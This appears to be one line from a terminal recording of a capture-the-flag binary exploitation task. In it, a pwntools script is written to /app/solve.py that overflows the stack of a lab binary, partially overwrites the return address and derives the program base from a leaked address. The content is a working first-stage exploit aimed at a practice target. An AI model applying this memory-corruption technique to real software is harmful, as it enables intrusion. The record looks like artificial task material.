[97.715526, "i", "cat << 'EOF' > /app/solve.py\nfrom pwn import *\n\ncontext.binary = elf = ELF('/app/gargantuan.bin')\nlibc = ELF('/app/libc.so.6')\n\np = process('/app/gargantuan.bin')\n\n# Phase 1: Overwrite LSB of RIP to return to main (0x12d9)\ntotal_padding = 0x528\npayload1 = b'\\x00' * total_padding + b'\\xd9'\n\nCHUNK_SIZE = 0x200\nfor i in range(5):\n    size_to_send = min(CHUNK_SIZE, len(payload1))\n    if size_to_send > 0:\n        chunk = payload1[:size_to_send]\n        payload1 = payload1[size_to_send:]\n        chunk = chunk.ljust(CHUNK_SIZE, b'\\x00')\n        p.send(chunk)\n    else:\n        p.send(b'\\x00' * CHUNK_SIZE)\n\n# Receive the leak\np.recvuntil(b'OO LATE! ')\nleak = int(p.recvline().strip(), 16)\nprint(f\"Leak: {hex(leak)}\")\nelf.address = leak - elf.symbols['gargantuan']\nprint(f\"ELF Base: {hex(elf.address)}\")\n\np.interactive()\nEOF\n"]
